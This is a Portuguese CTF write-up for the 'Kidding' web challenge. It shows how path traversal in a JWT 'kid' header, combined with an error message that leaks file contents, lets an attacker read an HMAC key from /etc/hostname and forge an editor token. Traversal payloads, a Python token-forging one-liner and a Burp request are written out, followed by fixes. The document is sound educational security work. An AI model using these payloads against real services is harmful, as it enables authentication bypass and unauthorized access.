# Writeup — Kidding (Sunshine CTF 2026)

**Categoria:** Web

**Dificuldade:** Média

**Flag:** `sun{h0tw1r3d_4dm1n_jwt}`

---

## Visão Geral

O desafio **Kidding** é um blog chamado **Chrome Horizon** (“The Motoring Journal of Tomorrow”). O objetivo é acessar a área restrita do **Editor’s Desk** para ler um “scoop embargado” (a flag).

O nome **“Kidding”** é uma pista direta: em JWT, o campo `kid` (**Key ID**) indica qual chave o servidor deve usar para verificar a assinatura. Se esse campo for controlável e não validado, é possível apontar para uma chave arbitrária — ou para um arquivo do sistema cujo conteúdo conhecemos.

**URL:** `https://kidding.web.2026.sunshinectf.games/`

---

## Reconhecimento

### 1.1 Página Inicial

A página inicial apresenta um blog com dois links principais:

- **Claim a free reader pass** (`/login`): permite obter um cookie de sessão (`token`).
- **Editor’s Desk** (`/admin`): área restrita, retorna **403/401** para usuários comuns.

### 1.2 Login e Cookie

Ao fazer login em `/login`, o servidor define um cookie:

```
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsImtpZCI6InJlYWRlci5rZXkiLCJ0eXAiOiJKV1QifQ...
```

**É um JWT.** Vamos decodificá-lo.

### 1.3 Decodificando o JWT

**Header:**

```json
{
  "alg": "HS256",
  "kid": "reader.key",
  "typ": "JWT"
}
```

**Payload:**

```json
{
  "sub": "blablablabla-reader",
  "role": "reader"
}
```

**Observações:**

- O `kid` aponta para um arquivo: `reader.key`.
- O `role` é `reader`. Precisamos ser `editor`.

### 1.4 Acesso a `/admin`

Acessando `/admin` com o cookie de `reader`, a resposta é:

```html
<div class="notice notice-bad">
  ⚠ ACCESS DENIED
  Your pass checks out as reader. The Editor's Desk is for editor passes only.
</div>
```

**Conclusão:** Precisamos forjar um JWT com `role: editor`.

---

## Explorando o Campo `kid`

O campo `kid` é usado pelo servidor para localizar a chave HMAC. Se ele faz algo como:

```python
key = open(f"/app/keys/{header['kid']}").read()
jwt.decode(token, key, algorithms=["HS256"])
```

…então um **path traversal** no `kid` permite apontar para qualquer arquivo.

### 2.1 Teste com `/dev/null`

Payload:

```json
{
  "alg": "HS256",
  "kid": "../../../../dev/null",
  "typ": "JWT"
}
```

**Resposta do servidor:**

```
⚠ PASS REJECTED :: HMAC key must not be empty.
Pass declared key file: ../../../../dev/null
```

**Conclusão:** O path traversal **funcionou** (o servidor leu o arquivo), mas ele **rejeita chave vazia**.

### 2.2 Teste com `/etc/hostname`

Payload:

```json
{
  "alg": "HS256",
  "kid": "../../../../etc/hostname",
  "typ": "JWT"
}
```

**Resposta do servidor:**

```
⚠ PASS REJECTED :: Signature verification failed
Pass declared key file: ../../../../etc/hostname

Loaded key file ../../../../etc/hostname. Dumping its contents:
e6e5020a00f1
```

**Conclusão:** O servidor **imprime o conteúdo do arquivo lido** na resposta de erro. Isso nos dá a chave HMAC usada para assinar o JWT!

---

## Forjando o Token

Agora sabemos:

- O `kid` deve apontar para `../../../../etc/hostname`.
- A chave HMAC é `e6e5020a00f1` (com newline no final, pois todo arquivo hostname termina com `\n`).
- O payload precisa ter `role: editor`.

### 3.1 Gerando o Token

**Script Python (uma linha):**

```bash
python3 -c "import jwt; print(jwt.encode({'sub':'blablablabla-reader','role':'editor'}, 'e6e5020a00f1\n', algorithm='HS256', headers={'kid':'../../../../etc/hostname'}))"
```

**Token gerado:**

```
eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9ob3N0bmFtZSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJibGFibGFibGEtcmVhZGVyIiwicm9sZSI6ImVkaXRvciJ9.XXXXX...
```

### 3.2 Enviando no Burp

Requisição:

```
GET /admin HTTP/2
Host: kidding.web.2026.sunshinectf.games
Cookie: token=eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9ob3N0bmFtZSIsInR5cCI6IkpXVCJ9...
Connection: close
```

**Resposta:**

```
HTTP/2 200 OK
```

```html
<div class="notice notice-good">
  ★ Editor Access Granted
  Welcome back to the desk, blablablabla-reader (editor).
</div>

<div class="flag-box">
  <div class="flag-box-title">The publisher's sealed scoop of the year</div>
  <span class="flag">sun{h0tw1r3d_4dm1n_jwt}</span>
</div>
```

**FLAG:** `sun{h0tw1r3d_4dm1n_jwt}`

---

## Cadeia de Vulnerabilidades

| # | Vulnerabilidade | Impacto |
| --- | --- | --- |
| 1 | **KID Path Traversal** | Permite apontar o `kid` para qualquer arquivo do sistema |
| 2 | **Dump de Conteúdo em Erro** | O servidor revela o conteúdo do arquivo lido (chave HMAC) |
| 3 | **Chave HMAC Fraca/Previsível** | Arquivos como `/etc/hostname` são previsíveis e legíveis |
| 4 | **Ausência de Validação de Role** | O `role` do JWT é usado diretamente sem verificação adicional |

---

## Recomendações de Correção

| Vulnerabilidade | Correção |
| --- | --- |
| KID Path Traversal | Validar o `kid` contra uma allowlist de chaves conhecidas; nunca usar input do usuário para montar caminhos |
| Dump de conteúdo | Nunca revelar o conteúdo de arquivos em mensagens de erro |
| Chave fraca | Usar chaves HMAC com 256+ bits, geradas aleatoriamente e armazenadas em cofre (ex: Vault, AWS Secrets Manager) |
| Validação de role | Sempre verificar o `role` no servidor, nunca confiar apenas no JWT |

---

## Lições Aprendidas

1. **O nome do desafio é sempre uma pista.** “Kidding” → KID → JWT → path traversal.
2. **Mensagens de erro são ouro.** O dump do conteúdo do arquivo foi o que tornou o ataque trivial.
3. **Path traversal + leitura de arquivo = comprometimento total.** Se o `kid` aponta para arquivos, é game over.
4. **Arquivos previsíveis em containers.** `/etc/hostname`, `/proc/version`, `/etc/machine-id` são comuns e úteis.
5. **JWT é um vetor clássico.** Sempre inspecione o header, teste `alg: none`, path traversal no `kid`, e chaves fracas.

---

## Conclusão

O desafio **Kidding** explora uma cadeia de vulnerabilidades em JWT:

1. O campo `kid` aceita **path traversal**.
2. O servidor **imprime o conteúdo** do arquivo lido na mensagem de erro.
3. A chave HMAC pode ser obtida lendo um arquivo previsível (`/etc/hostname`).
4. Com a chave, forjamos um JWT com `role: editor` e acessamos `/admin`.

**Nenhuma injeção, RCE ou bypass criptográfico complexo foi necessário.** A falha estava na **confiança cega no campo `kid` do JWT** e no **vazamento de informações via mensagens de erro**.

---

**Autor:** Marcos Vinícius

**Data:** 26 de Setembro de 2026

**CTF:** Sunshine CTF 2026

**Categoria:** Web

**Flag:** `sun{h0tw1r3d_4dm1n_jwt}`
